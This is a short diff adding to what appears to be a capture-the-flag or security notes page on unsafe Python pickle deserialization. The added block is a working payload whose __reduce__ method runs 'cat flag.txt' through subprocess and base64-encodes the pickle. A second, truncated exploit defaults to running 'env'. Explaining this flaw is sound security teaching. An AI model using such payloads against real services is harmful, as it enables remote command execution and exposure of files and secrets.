@@ -36,6 +36,21 @@ The pickle module is vulnerable to unsafe deserialization of Python objects.
 Exploit:
 
 ```py
+import base64, os, pickle, subprocess
+
+class RCE:
+    def __reduce__(self):
+        cmd = 'cat flag.txt'
+        a = subprocess.check_output, (cmd,)
+        return a
+
+pickled = pickle.dumps(RCE())
+print(base64.urlsafe_b64encode(pickled))
+```
+
+Note that the exploit below may not work on all systems/challenges.
+
+```py
 DEFAULT_COMMAND = ['env']
 
 import pickle
